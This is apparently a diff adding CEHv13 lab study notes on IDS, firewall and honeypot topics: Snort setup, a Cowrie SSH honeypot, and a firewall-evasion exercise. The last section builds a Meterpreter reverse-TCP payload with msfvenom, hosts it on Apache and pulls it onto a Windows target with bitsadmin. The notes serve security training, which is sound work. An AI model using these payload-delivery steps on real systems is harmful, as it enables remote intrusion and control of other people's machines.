@@ -1756,3 +1756,155 @@ It’s basically a wrapper around the OpenAI API.
   - You can observe that bettercap starts sniffing network traffic on different machines in the network
   - witch back to the Windows 11 machine and observe the huge number of ARP packets captured by the Wireshark  
 </details>
+
+# Evading IDS, Firewalls, and Honeypots
+<details>
+<summary>Perform Intrusion Detection using Various Tools</summary>
+
+* Detect Intrusions using Snort :~
+  - open window 11 and open the snort or exicute the snort or install the snort
+  - copy the snort.conf and paste it to C:\Snort\etc
+  - copy so_rules, rules and preproc_rules to C:\Snort\
+  - open cmd and if its not working open cmd as administrator
+  - change directory cd C:\Snort\bin
+  - enter snort command to excicute the snort
+  - type snort -W
+    - This command lists your machine's physical address, IP address, and Ethernet Drivers
+  - Observe your Ethernet Driver index number and write it down
+  - To enable the Ethernet Driver, in the command prompt, run command 
+    - snort -dev -i 2  (2 = driver index number)
+  - leave the snort and open another command prompt
+  - ping google.com
+    - This ping command triggers a Snort alert in the Snort command prompt with rapid scrolling text
+  - close the both command prompt
+  - Configure the snort.conf file, located at C:\Snort\etc and open that snort file in notepad
+  - the Step #1: Set the network variables section (Line 41) of the snort.conf file. In the HOME_NET line (Line 45), replace any with the IP addresses of the machine(10.10.1.11, in which system the snort is running)
+  - then make changes in the DNS_SERVERS line by replacing $HOME_NET with your DNS Server IP address(8.8.8.8)
+  - Scroll down to RULE_PATH (Line 104). In Line 104, replace ../rules with C:\Snort\rules in Line 105, replace ../so_rules with C:\Snort\so_rules and in Line 106, replace ../preproc_rules with C:\Snort\preproc_rules
+  - In Lines 109 and 110, replace ../rules with C:\Snort\rules and minimize the notepad
+  - Navigate to C:\Snort\rules, and create two text files; name them white_list and black_list and change their file extensions from .txt to .rules
+  - Switch back to Notepad++, scroll down to the Step #4: Configure dynamic loaded libraries section (Line 238)
+  - Add the path to dynamic preprocessor libraries (Line 243); replace /usr/local/lib/snort_dynamicpreprocessor/ with your dynamic preprocessor libraries folder location is C:\Snort\lib\snort_dynamicpreprocessor
+  - At the path to base preprocessor (or dynamic) engine (Line 246), replace /usr/local/lib/snort_dynamicengine/libsf_engine.so with your base preprocessor engine C:\Snort\lib\snort_dynamicengine\sf_engine.dll
+  - Add (space) in between # and dynamicdetection (Line 249)
+  - he Step #5: Configure preprocessors section 
+  - Comment out all the preprocessors listed in this section by adding '#' and (space) before each preprocessor rule (261-265)
+  - Scroll down to line 321 and delete lzma keyword and a (space)
+  - to Step #6: Configure output plugins (Line 513)
+  - These two files are in C:\Snort\etc. Provide this location of files in the configure output plugins (in Lines 527 and 528) (i.e., C:\Snort\etc\classification.config and C:\Snort\etc\reference.config
+  - In Step #6, add to line (529) output alert_fast: alerts.ids:
+    - this command orders Snort to dump all logs into the alerts.ids file
+  - In the snort.conf file, find and replace the ipvar string with var using find and replace option
+    - By default, the string is ipvar, which is not recognized by Snort
+  - we have enabled the ICMP rule so that Snort can detect any host discovery ping probes directed at the system running Snort
+  - Navigate to C:\Snort\rules and open the icmp-info.rules file with Notepad
+  - line 21, type 
+    ```console
+          alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.11 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)       
+    ```       
+  - save the notepad and close
+  - now open command prompt or command prompt as administrator and chamge directory cd C:\Snort\bin\
+  - run the command
+    ```console
+         snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+    ```
+    - here X = device index number(in this task it is 2)     
+  - If you receive a fatal error, you should first verify that you have typed all modifications correctly into the snort.conf file
+  - If you have entered all command information correctly, you receive a comment stating Commencing packet processing (pid=xxxx)
+  - After initializing interface and logged signatures, Snort starts and waits for an attack and triggers alerts when attacks occur on the machine
+  - leave the command prompt running and open another mechine for check the snort
+  - open command prompt and run ping 10.10.1.11 -t
+  - switch back to the windows 11 and observe that the snort triggers the alarm
+  - Go to the C:\Snort\log\10.10.1.19 folder and open the ICMP_ECHO.ids file with Notepad and you will see all the log entries are stored in ICMP_ECHO.ids   
+
+* Deploy Cowrie Honeypot to Detect Malicious Network Traffic :~
+  - switch to the Ubuntu machine and login
+  - Ubuntu machine, we will deploy Cowrie honeypot
+  - Open a Terminal window and execute 
+    ```console
+         sudo adduser --disabled-password cowrie
+    ```
+    - Leave Full Name, Room Number, Work Phone, Home Phone, Other blank and type Y when prompted Is the information correct? [Y/n]       
+  -  Files icon and navigate to ceh tools on 10.10.1.11/CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots/Honeypot Tools and copy cowrie folder and paste it into /home/ubuntu
+  - Open Files and navigate to the + Other Locations from the left pane
+  In the Connect to Server field, type smb://10.10.1.11 and press Enter to access Windows 11
+  - pen a new terminal and execute sudo su to run the programs as a root user and cd cowrie for cowrie directory
+  - run this command for download dependency files
+    ```console
+         pip install --upgrade -r requirements.txt
+    ```
+  - cd .. run this for previous directory
+  - for modify the file permision
+    ```console
+         chmod -R 777 cowrie
+    ```
+  - run this command to redirect the traffic coming on port 22 to port 2222
+    ```console
+         iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+    ```
+    - -t nat specifies the table in which the rule should be added
+    - A PREROUTING specifies that the rule should be appended to the PREROUTING chain
+    - -p tcp specifies the protocol to which the rule should apply
+    - --dport 22 specifies the destination port
+    - -j REDIRECT specifies the target of the rule
+    - --to-port 2222 specifies the port to which the packet should be redirected
+  - run the following commands to configure authbind, enabling the Cowrie honeypot to operate on port 22 without requiring root privileges
+    - run this command to create an authbind configuration file for port 22:
+      - touch /etc/authbind/byport/22  
+    - run this command to change the ownership of the authbind configuration file for port 22 to the user and group "cowrie,"
+      - chown cowrie:cowrie /etc/authbind/byport/22
+    - run this command to set appropriate permissions on the authbind configuration file for port 22
+      - chmod 770 /etc/authbind/byport/22
+  - run this command to create virtual environment
+    ```console
+         virtualenv --python=python3 cowrie-env
+    ```
+  - run this command to activate the evironment
+    ```console    
+         source cowrie-env/local/bin/activate
+    ```
+  - exit from the root user using exit commmand and change directory to cowrie using cd cowrie
+  - run this command to initiate the Cowrie honeypot and begin monitoring and logging incoming traffic for security analysis and threat detection purposes
+    - bin/cowrie start
+  - switch back to the user to superuser using sudo su
+  - to navigate to var/log/cowrie use the command cd var/log/cowrie/ 
+  - run this command to view log file 
+    - tail cowrie.log 
+  - we will use Parrot Security machine as an attacker to attack the honeypot running SSH service. To do so, firstly we will scan the target machine for open SSH port
+  - open the parrot mechine and  run sudo su for toor previlage
+  - run this command to discover open ports and services  
+    - nmap -p- -sV 10.10.1.9 
+  - You can observe that the port 22 is open and is the default port used for SSH connection
+  - To establish a connection to the target machine via SSH, we will use PuTTY. Initiate the PuTTY interface by executing putty command
+  - enter the ipaddress and click open
+  - try to login to honeypot system using credentials
+  - switch back to Ubuntu machine, and run tail cowrie.log then you can see what attacker try to access your system you can see here 
+  - whatever attacker try to do and try to access to your honeypot system you can see in tail cowrie.log
+</details>
+
+<details>
+<summary>Evade IDS/Firewalls using Various Evasion Techniques</summary>
+
+* Evade Firewall through Windows BITSAdmin :~
+  - switch to the Windows Server 2019 machine and launch Control Panel
+    - control panel --> system and security --> Windows Defender Firewall --> Turn Windows Defender Firewall on or off --> Turn on Windows Defender Firewall under Private network settings and Public network settings
+  - switch to the Parrot Security machine. Open a Terminal window and execute sudo su
+  - create payload using metasploit framework
+    ```console
+         msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe
+    ```
+  - create a directory to share this file with the target machine, provide the permissions, and copy the file from /home/attacker to the shared location
+    - mkdir /var/www/html/share/
+    - chmod -R 755 /var/www/html/share
+    - chown -R www-data:www-data /var/www/html/share
+    - cp Exploit.exe /var/www/html/share
+  - now you will start the apache server
+    - service apache2 start
+  - switch to Windows Server 2019
+  - open the Windows PowerShell
+  - this BITSAdmin transfers the file
+    - bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+  - Open File Explorer and Navigate to C: drive, you can see that the malicious file is successfully transferred             
+</details>
+
+
